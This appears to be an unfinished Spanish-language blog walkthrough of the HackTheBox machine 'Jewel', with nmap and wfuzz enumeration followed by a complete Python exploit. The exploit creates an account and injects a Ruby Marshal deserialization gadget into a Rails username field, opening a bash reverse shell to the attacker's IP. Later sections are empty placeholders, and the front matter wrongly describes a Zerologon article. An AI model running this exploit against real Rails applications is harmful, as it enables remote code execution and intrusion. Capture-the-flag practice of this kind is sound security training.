---
title: HackTheBox Jewel
layout: single
excerpt: Mucho se está hablando acerca de la nueva vulnerabilidad Zerologon, pero...
  ¿realmente es crítica?. Lo analizaremos en detalle en este artículo.
date: '2020-09-16'
classes: wide
header:
  teaser: "/assets/images/zerologon/zerologon.png"
  teaser_home_page: true
categories:
- Utilidades
- Exploits
- Vulnerabilidades
- HackTheBox
tags:
- Pentesting
- Herramientas
- Windows
- Linux
- Domain Controller
- Guías
- Privilege Escalation
---

<div style="float: left; margin-left: 45px; margin-right: 35px;margin-top: 35px;">
	<table>
                                <thead>
                                   <tr>
                                        <th>Column  </th><th>
                                            Detalles
                                </th></tr></thead><tbody>
                                    <tr>
                                        <td>Name
                                        </td><td>
                                            Jewel
                                    </td></tr><tr>
                                        <td>IP
                                        </td><td>
                                            10.10.10.211
                                    </td></tr><tr>
                                        <td>Points
                                        </td><td>
                                            30
                                    </td></tr><tr>
                                        <td>Os
                                        </td><td>
                                            Linux
                                    </td></tr><tr>
                                        <td>Medium
                                        </td><td>
                                            Hard
                                    </td></tr><tr>
                                        <td>Creator
                                        </td><td>
                                            <a href="https://www.hackthebox.eu/home/users/profile/159204" target="_blank">polarbearer</a>
                                    </td></tr><tr>
                                        <td>Out On
                                        </td><td>10 Oct 2020
                            </td></tr></tbody>
</table>
	</div>
	
<div>
	<p align="left">
<img src="/assets/images/jewel/jewel.png">
</p>
</div>

# Resumen

* [`Nmap` muestra los 3 puertos abiertos.](#nmap-muestra-los-3-puertos-abiertos) 
- [Conseguir el `web server`](#conseguir-el-web-server)
- [Inyecctando la `Shell` en el servidor](#inyecctando-la-shell-en-el-servidor)
- [Conseguir la `Shell` desde el servidor](#conseguir-la-shell-desde-el-servidor)
- [Conseguir el password de la cuenta de bill en los `backups del servidor`](#conseguir-el-password-de-la-cuenta-de-bill-en-los-backups-del-servidor)
- [Obtener el codigo de `Google Authenticator`](#obtener-el-codigo-de-google-authenticator)
- [Usando el comando `sudo -l`](#usando-el-comando-sudo--l)
- [Con la ayuda de GTFO bins obtenemos el root.txt](#con-la-ayuda-de-gtfo-bins-obtenemos-el-roottxt)


## `Nmap` muestra los 3 puertos abiertos.
Primero añadinos a nuestro `/etc/hosts` la máquina Jewel.
```bash 
echo "10.10.10.211  jewel.htb" >> /etc/hosts
```
Cada uno tiene su forma de hacer la enumeración de puertos/servicios corriendo bajo un sistema. Yo generalmente suelo seguir estos pasos.

* scaneo inicial de puertos abiertos sobre el sistema

```bash 
nmap -nmap -p- --open -T5 -v -n 10.10.10.211
```
<p align="center">
<img src="/assets/images/jewel/nmap1.png">
</p>

* Enumeración del servicio y versionado para los puertos descubiertos sobre el sistema

```bash
nmap -p$(cat allPorts | grep -oP '\d{2,5}/open' | awk '{print $1}' FS="/" | xargs | tr ' ' ',') -sC -sV 10.10.10.211 -oN targeted
```
La razón de hacer esto es que me parece mucho más ágil el poder tener una visual de los puertos abiertos de un primer tirón para el escaneo inicial, así en lo que posteriormente lanzo el profundo de enumeración de servicios con los scripts básicos de enumeración, puedo ir enumerando por mi cuenta los puertos que corren servicios conocidos (HTTP, HTTPS, FTP, ms-sql-s, etc.).

* En caso de contar con un escaneo inicial lento, suelo aplicar la siguiente variante

```bash
nmap -A -T4 -v 10.10.10.211 -oN misc
```

Este escaneo no engloba todos los puertos, y probablemente nos estemos saltando algunos interesantes que escapen de este escaneo. En tal caso podemos ir englobando rangos de búsqueda a fin de determinar los puertos que están abiertos (Pues lanzando el -p- cuando se demora mucho tiempo nmap suele detener el escaneo haciéndolo incompleto):

```bash
nmap -p1-10000 --open -T5 -v ipHost -n -oG range1-10000
nmap -p10000-20000 --open -T5 -v ipHost -n -oG range10000-20000
nmap -p20000-30000 --open -T5 -v ipHost -n -oG range20000-30000
                        .
                        .
                        .
```

En caso de figurar un servicio HTTP corriendo bajo un puerto, podemos aprovecharnos del script http-enum.nse de nmap para enumerar directorios y archivos del servicio web (Cuenta con un diccionario pequeño pero nos puede servir para tener una visual rápida sobre los recursos alojados):

```bash
nmap --script=http-enum.nse -p80,443,8080 10.10.10.211 -oN webScan
```

* Visualización de categorías para los scripts de nmap

```bash
grep -r categories /usr/share/nmap/scripts/*.nse | grep -oP '".*?"' | sort -u
```

Estas categorías son todas las que nmap posee, pudiendo por ejemplo para un servicio FTP o SMB aplicar las siguientes categorías:

```bash
nmap -p21,445 --script="vuln and safe" 10.10.10.211 -oN vulnSafeScan
```






```bash 
nmap --min-rate 5000 --open -vvv -n -Pn -p- 10.10.10.211 -oG allPorts
```
<p align="center">
<img src="/assets/images/jewel/nmap2.png">
</p>

```bash
extractPorts allPorts
```

```bash 
which extratPorts
```

```bash 
nmap -sC -sV -p8080 10.10.10.211 -oN targeted
```

```bash 
sudo whatweb http://10.10.10.211:8080 2>/dev/null
```

```bash 
nmap --script http-enum -p8080 10.10.10.211 -oN webScan
```

```bash 
wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.211:8080/FUZZ
```

```bash 

```


## Conseguir el `web server`
Script en python para conseguir `Shell`

```python
import requests
import re
import sys

URL='http://{}:8080'.format(sys.argv[1])
username='myuser4'
password='mypass4'
email='myuser4@mail.com'

if len(sys.argv) != 4:
    print("specify target IP, your IP and port: python3 rev.py 10.10.xx.xx 9001")
    exit(0)

s = requests.Session()

resp = s.get(URL + '/signup')
rx = r'token" content="(.*)"'

token = re.search(rx,resp.text).group(1)

# create user
data = {}
data['utf8'] = 'â'
data['authenticity_token'] = token
data['user[username]'] = username
data['user[email]'] = email
data['user[password]'] = password
data['commit'] = 'Create User'
resp = s.post(URL + '/users', data=data)

# login
data = {}
data['utf8'] = 'â'
data['authenticity_token'] = token
data['session[email]'] = email
data['session[password]'] = password
data['commit'] = 'Log in'
resp = s.post(URL + '/login', data=data)

rx = r'href="/users/(.*)"'
user_id = re.search(rx,resp.text).group(1)

# rev shell
rev = "bash -c 'bash -i >& /dev/tcp/{}/{} 0>&1'".format(sys.argv[2], sys.argv[3])
payload = '\x04\x08o\x3A\x40ActiveSupport\x3A\x3ADeprecation\x3A\x3ADeprecatedInstanceVariableProxy'
payload += '\x09\x3A\x0E\x40instanceo\x3A\x08ERB\x08\x3A\x09\x40srcI\x22'
payload += '{}\x60{}\x60'.format(chr(len(rev)+7), rev)
payload += '\x06\x3A\x06ET\x3A\x0E\x40filenameI\x22\x061\x06\x3B\x09T\x3A\x0C\x40linenoi\x06\x3A\x0C\x40method\x3A'
payload += '\x0Bresult\x3A\x09\x40varI\x22\x0C\x40result\x06\x3B\x09T\x3A\x10\x40deprecatorIu\x3A\x1F'
payload += 'ActiveSupport\x3A\x3ADeprecation\x00\x06\x3B\x09T'

data = {}
data['utf8'] = 'â'
data['authenticity_token'] = token
data['_method'] = 'patch'
data['user[username]'] = payload
data['commit'] = 'Update User'
s.post(URL + '/users/' + user_id, data=data)
s.post(URL + '/users/' + user_id, data=data)

s.get(URL + '/articles')
```

## Inyecctando la `Shell` en el servidor
xxxxxxxxxxxxxxx

## Conseguir la `Shell` desde el servidor
xxxxxxxxxxxxxxx

## Conseguir el password de la cuenta de bill en los `backups del servidor`
xxxxxxxxxxxxxxx

## Obtener el codigo de `Google Authenticator`
xxxxxxxxxxxxxxx

## Usando el comando `sudo -l`
xxxxxxxxxxxxxxx

## Con la ayuda de GTFO bins obtenemos el root.txt
xxxxxxxxxxxxxxxc
